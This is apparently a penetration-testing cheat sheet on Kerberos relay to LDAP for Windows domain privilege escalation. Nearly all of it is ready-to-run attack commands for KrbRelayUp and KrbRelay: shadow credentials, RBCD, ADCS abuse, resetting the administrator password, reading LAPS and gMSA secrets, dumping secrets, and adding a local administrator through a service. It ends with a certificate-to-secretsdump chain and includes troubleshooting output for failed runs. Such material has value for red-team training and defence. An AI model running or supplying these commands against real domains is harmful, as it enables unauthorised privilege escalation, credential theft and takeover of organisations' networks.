# Kerberos Relay to LDAP - KrbRelay

## Kerberos Relay to LDAP - KrbRelay [t-ad-kerberos-kerberos_relay]

Kerberos Relay to LDAP. This is essentially a universal no-fix local privilege escalation 
in windows domain environments where LDAP signing is not enforced (the default settings).


### 1.1 None




**option 1: KrbRelayUp**

{% code overflow="wrap" %}
```bash
#Shadow Credentials (preffered way)
.\KrbRelayUp.exe relay -m shadowcred -cls {8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
.\KrbRelayUp.exe full -m shadowcred --ForceShadowCred

#Using a new computer account (already owned accounts can be used as well, check the tool info)
.\KrbRelayUp.exe relay -Domain domain.com -CreateNewComputerAccount -ComputerName evilhost$ -ComputerPassword pass@123

#ADCS
.\KrbRelayUp.exe full -m adcs

```
{% endcode %}

{% hint style="info" %}Errors:

Bad CLSID:
System.Runtime.InteropServices.COMException (0x80070422): The service cannot be started, 
either because it is disabled or because it has no enabled devices associated with it. 
(Exception from HRESULT: 0x80070422)


Firewall blocking the OXID resolver:
System.Runtime.InteropServices.COMException (0x800706BA): The RPC server is unavailable. 
(Exception from HRESULT: 0x800706BA)

Kerberos Issues (Authentication type not recognized), Will work after reboot/clock sync:
System.Runtime.InteropServices.COMException (0x800706D3): The authentication service is unknown.

A valid apReq starts with 0x60, check your environment and parameters:
[*] apReq: 05000b0710000000db003300020<SNIP>

CLSID impersonation level or authentication level too low:
[*] fContextReq: Delegate, MutualAuth, UseDceStyle, Connection
System.UnauthorizedAccessException: Access is denied.

Access is denied.


{% endhint %}


**option 2: KrbRelay**

{% code overflow="wrap" %}
```bash
#CLSIDs are different for different Windows versions!!!
Check the list on https://github.com/cube0x0/KrbRelay

Tool for discovering CLSIDs: https://github.com/tyranid/oleviewdotnet

Examples:
# LPE
.\KrbRelay.exe -spn ldap/dc01.htb.local -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -rbcd S-1-5-21-2982218752-1219710089-3973213059-1606
.\KrbRelay.exe -spn ldap/dc01.htb.local -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -shadowcred

# Cross-Session LDAP
.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -shadowcred
.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -shadowcred win2016$
.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -rbcd S-1-5-21-2982218752-1219710089-3973213059-1606 win2016$
.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -add-groupmember srv_admins domain_user
.\KrbRelay.exe -spn ldap/dc01.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -laps
.\KrbRelay.exe -spn ldap/dc02.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -ssl -gmsa
.\KrbRelay.exe -spn ldap/dc02.htb.local -session 2 -clsid 8F5DF053-3013-4dd8-B5F4-88214E81C0CF -ssl -reset-password administrator Password123!

# Cross-Session HTTP
.\KrbRelay.exe -spn http/exchange.htb.local -endpoint EWS/Exchange.asmx -ssl -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ews-search beta,test
.\KrbRelay.exe -spn http/exchange.htb.local -endpoint EWS/Exchange.asmx -ssl -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -ews-delegate domain_user@htb.local
.\KrbRelay.exe -spn http/win2016.htb.local -endpoint iisstart.htm -proxy -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182

# Cross-Session SMB
.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -console
.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -add-privileges (([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value)
.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -secrets 
.\KrbRelay.exe -spn cifs/win2016.htb.local -session 2 -clsid 354ff91b-5e49-4bdc-a8e6-1cb6c6877182 -service-add addUser "C:\windows\system32\cmd.exe /c """"C:\windows\system32\net user cube Password123! /add && C:\windows\system32\net localgroup administrators cube /add"""""

# LLMNR
.\KrbRelay.exe -llmnr -spn 'cifs/win2019.htb.local' -secrets

# NTLM (see https://github.com/antonioCoco/RemotePotato0 for CLSIDs)
.\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm
.\KrbRelay.exe -session 1 -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm -downgrade

CheckPort.exe is a C# tool that can be used to discover available ports for the OXID resolver.
C:\Users\domain_user\Desktop\KrbRelay\CheckPort\bin\Release\CheckPort.exe
[*] Looking for available ports..
[*] Port: 1024 is available

```
{% endcode %}

### 1.2 None



{% code overflow="wrap" %}
```bash
echo “MIIKQA…” | base64 -d > dc_cert.pfx
python3 gettgtpkinit.py domain.com/DC\$ -cert-pfx dc_cert.pfx -pfx-pass 'pfx_password' dc.ccache
KRB5CCNAME=dc.ccache impacket-secretsdump -k -no-pass dc.domain.com

```
{% endcode %}

